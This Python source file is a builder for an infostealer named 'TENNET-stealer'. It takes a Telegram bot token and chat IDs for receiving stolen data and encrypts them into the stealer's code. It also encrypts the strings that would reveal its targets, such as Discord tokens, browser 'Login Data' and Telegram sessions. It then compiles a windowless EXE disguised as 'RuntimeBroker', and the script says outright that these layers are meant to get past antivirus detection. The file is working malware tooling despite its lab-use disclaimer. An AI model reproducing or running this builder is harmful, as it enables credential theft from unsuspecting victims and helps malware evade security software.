"""
TENNET-stealer Builder — interactive EXE builder with multi-layer obfuscation.
For authorized security research / lab use only.
"""

import base64
import hashlib
import os
import re
import secrets
import subprocess
import sys
import textwrap
import zlib

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


def _app_dir():
    if getattr(sys, 'frozen', False):
        return sys._MEIPASS
    return os.path.dirname(os.path.abspath(__file__))


_WORK = os.getcwd() if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
ROOT = _app_dir()
SRC_TENNET = os.path.join(ROOT, 'tennet.py')
BUILD_DIR = os.path.join(_WORK, 'build')
DIST_DIR = os.path.join(_WORK, 'dist')

HIDDEN_IMPORTS = [
    'windows', 'windows.crypto', 'windows.generated_def',
    'Crypto', 'Crypto.Cipher', 'Crypto.Cipher.AES', 'Crypto.Random',
    'win32crypt',
    'cryptography', 'cryptography.hazmat.primitives.ciphers.aead',
    'requests',
]

EXCLUDE_MODULES = [
    'tkinter', 'matplotlib', 'numpy', 'pandas', 'PIL', 'pytest',
    'unittest', 'pydoc', 'doctest', 'xmlrpc', 'curses',
]

IOC_STRINGS = [
    'api.telegram.org',
    'discord.com/api',
    'discord.com',
    'api.ipify.org',
    'Telegram Desktop',
    'discordcanary',
    'discordptb',
    'Local Storage',
    'leveldb',
    'Login Data',
    'Web Data',
    'sendDocument',
    'sendMessage',
]


def _rand_name(prefix='_'):
    return prefix + secrets.token_hex(5)


def _prompt(label, secret=False):
    try:
        if secret:
            import getpass
            return getpass.getpass(f'  {label}: ').strip()
        return input(f'  {label}: ').strip()
    except (EOFError, KeyboardInterrupt):
        print('\n  Cancelled.')
        sys.exit(1)


def _chunk_blob(blob, size=48):
    return tuple(blob[i:i + size] for i in range(0, len(blob), size))


def _pack_string(value, master_seed):
    key = hashlib.sha256(master_seed + value.encode()).digest()
    roll = hashlib.sha256(master_seed[::-1]).digest()[:24]
    comp = zlib.compress(value.encode('utf-8'), 9)
    xored = bytes(comp[i] ^ roll[i % len(roll)] for i in range(len(comp)))
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(xored)
    return base64.b64encode(nonce + ct + tag).decode('ascii')


def _runtime_prelude(seed, fn_u, fn_i, fn_c, ioc_blobs, cfg_blobs):
    ioc_lit = ',\n    '.join(repr(b) for b in ioc_blobs) or repr('')
    cfg_parts = []
    for blob in cfg_blobs:
        chunks = _chunk_blob(blob)
        cfg_parts.append('(' + ', '.join(repr(c) for c in chunks) + ')')
    cfg_lit = ',\n    '.join(cfg_parts)

    return textwrap.dedent(f'''
        _S = bytes.fromhex({seed.hex()!r})

        def {fn_u}(_x, _hint=''):
            import base64 as _B, zlib as _Z, hashlib as _H
            from Crypto.Cipher import AES as _A
            _n = _B.b64decode(_x)
            _k = _H.sha256(_S + _hint.encode()).digest()
            _roll = _H.sha256(_S[::-1]).digest()[:24]
            _nonce, _rest = _n[:12], _n[12:]
            _tag, _ct = _rest[-16:], _rest[:-16]
            _raw = _A.new(_k, _A.MODE_GCM, nonce=_nonce).decrypt_and_verify(_ct, _tag)
            _xored = bytes(_raw[_i] ^ _roll[_i % len(_roll)] for _i in range(len(_raw)))
            return _Z.decompress(_xored).decode()

        _IOC_TBL = [
            {ioc_lit}
        ]

        def {fn_i}(_idx):
            _b = _IOC_TBL[_idx]
            return {fn_u}(_b, _b[:8])

        def {fn_c}():
            _raw = [
                {cfg_lit}
            ]
            _vals = []
            for _entry in _raw:
                _s = ''.join(_entry)
                _vals.append({fn_u}(_s, _s[:8]))
            return _vals[0], _vals[1:]

        TG_TOKEN, TG_CHAT_IDS = {fn_c}()
    ''').strip()


def _strip_source(source):
    source = re.sub(r'^""".*?"""\s*\n', '', source, count=1, flags=re.DOTALL)
    source = re.sub(r'^Build:.*\n', '', source, flags=re.MULTILINE)
    source = re.sub(r'^\s*#(?!!).*$', '', source, flags=re.MULTILINE)
    source = re.sub(r'\n{3,}', '\n\n', source)
    return source


def _obfuscate_literals(source, seed, fn_i):
    present = [(s, _pack_string(s, seed + s.encode())) for s in IOC_STRINGS if f"'{s}'" in source or f'"{s}"' in source]
    for ioc, _ in present:
        idx = next(i for i, (s, _) in enumerate(present) if s == ioc)
        source = source.replace(f"'{ioc}'", f'{fn_i}({idx})')
        source = source.replace(f'"{ioc}"', f'{fn_i}({idx})')
    return source, [b for _, b in present]


def _insert_junk(source):
    chunks = []
    for _ in range(secrets.randbelow(3) + 4):
        name = _rand_name('_j')
        chunks.append(
            f'def {name}():\n'
            f'    return int({secrets.token_hex(4)!r}, 16) ^ {secrets.randbelow(99999)}\n'
        )
    return '\n'.join(chunks) + '\n\n' + source


def _inject_config(source, token, chat_ids):
    seed = secrets.token_bytes(32)
    source = _strip_source(source)
    source = re.sub(r'^TG_TOKEN\s*=.*\n^TG_CHAT_IDS\s*=.*\n', '', source, flags=re.MULTILINE)

    fn_u, fn_i, fn_c = _rand_name('_u'), _rand_name('_i'), _rand_name('_c')
    source, ioc_blobs = _obfuscate_literals(source, seed, fn_i)

    cfg_blobs = [_pack_string(token, seed)] + [_pack_string(c, seed) for c in chat_ids]
    prelude = _runtime_prelude(seed, fn_u, fn_i, fn_c, ioc_blobs, cfg_blobs)

    marker = 'SW_HIDE    = 0\n'
    if marker not in source:
        raise RuntimeError('tennet.py layout changed — cannot inject config')

    source = source.replace(marker, marker + prelude + '\n\n', 1)
    return _insert_junk(source)


def _write_stub(source):
    os.makedirs(BUILD_DIR, exist_ok=True)
    stub = os.path.join(BUILD_DIR, 'tennet_stub.py')
    with open(stub, 'w', encoding='utf-8') as f:
        f.write(source)
    return stub


def _check_pyinstaller():
    try:
        subprocess.run(
            [sys.executable, '-m', 'PyInstaller', '--version'],
            capture_output=True, check=True, timeout=30,
        )
        return True
    except Exception:
        return False


def _build_payload(stub_path, exe_name):
    hidden = [x for m in HIDDEN_IMPORTS for x in ('--hidden-import', m)]
    excludes = [x for m in EXCLUDE_MODULES for x in ('--exclude-module', m)]

    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole', '--clean',
        '--name', exe_name,
        '--distpath', DIST_DIR,
        '--workpath', os.path.join(BUILD_DIR, 'pyi-work'),
        '--specpath', BUILD_DIR,
        '--noupx',
        *hidden, *excludes,
        stub_path,
    ]

    print('\n  [*] Compiling payload (PyInstaller)...')
    if subprocess.run(cmd, cwd=_WORK).returncode != 0:
        print('  [!] Build failed')
        sys.exit(1)

    out = os.path.join(DIST_DIR, f'{exe_name}.exe')
    if not os.path.exists(out):
        print('  [!] EXE not found')
        sys.exit(1)
    print(f'  [+] Payload: {out}')
    print(f'  [+] Size:    {os.path.getsize(out) / (1024 * 1024):.1f} MB')


def main():
    if sys.platform == 'win32':
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

    print()
    print('  ╔══════════════════════════════════════════╗')
    print('  ║       ⚡  T E N N E T   B U I L D E R       ║')
    print('  ╚══════════════════════════════════════════╝')
    print()
    print('  Multi-layer obfuscation + PyInstaller payload build.')
    print('  Authorized lab / research use only.\n')

    if not os.path.exists(SRC_TENNET):
        print(f'  [!] tennet.py not found: {SRC_TENNET}')
        print('  [!] Keep tennet.py beside TennetBuilder.exe')
        sys.exit(1)

    token = _prompt('Telegram bot token', secret=True)
    if not token or ':' not in token:
        print('  [!] Invalid token')
        sys.exit(1)

    chat1 = _prompt('Telegram chat / user ID #1')
    if not chat1.lstrip('-').isdigit():
        print('  [!] Chat ID must be numeric')
        sys.exit(1)

    chat2 = _prompt('Chat ID #2 (optional, Enter to skip)')
    chat_ids = [chat1]
    if chat2:
        if not chat2.lstrip('-').isdigit():
            print('  [!] Invalid second chat ID')
            sys.exit(1)
        chat_ids.append(chat2)

    exe_name = _prompt('Payload EXE name [RuntimeBroker]') or 'RuntimeBroker'
    exe_name = re.sub(r'[^\w\-]+', '', exe_name) or 'RuntimeBroker'

    print()
    print('  ── Build plan ────────────────────────────')
    print(f'  Recipients : {", ".join(chat_ids)}')
    print(f'  Output     : dist\\{exe_name}.exe')
    print('  Obfuscation layers:')
    print('    • AES-256-GCM + rolling XOR + zlib (per-build keys)')
    print('    • IOC string encryption ({0} signatures)'.format(len(IOC_STRINGS)))
    print('    • Random function names each build')
    print('    • Dead-code noise functions')
    print('    • Comment / docstring stripping')
    print('    • PyInstaller --noupx')
    print()
    print('  Honest note: this reduces static signatures but cannot')
    print('  guarantee AV bypass. Test only in an isolated lab VM.')
    print()

    if input('  Build? [Y/n]: ').strip().lower() in ('n', 'no'):
        sys.exit(0)

    if not _check_pyinstaller():
        print('  [!] pip install pyinstaller')
        sys.exit(1)

    print('  [*] Reading tennet.py...')
    with open(SRC_TENNET, 'r', encoding='utf-8') as f:
        source = f.read()

    print('  [*] Applying obfuscation layers...')
    patched = _inject_config(source, token, chat_ids)
    stub = _write_stub(patched)
    _build_payload(stub, exe_name)

    print()
    print('  ╔══════════════════════════════════════════╗')
    print('  ║              ✅  BUILD DONE               ║')
    print('  ╚══════════════════════════════════════════╝')
    print(f'\n  Payload: dist\\{exe_name}.exe\n')


if __name__ == '__main__':
    main()
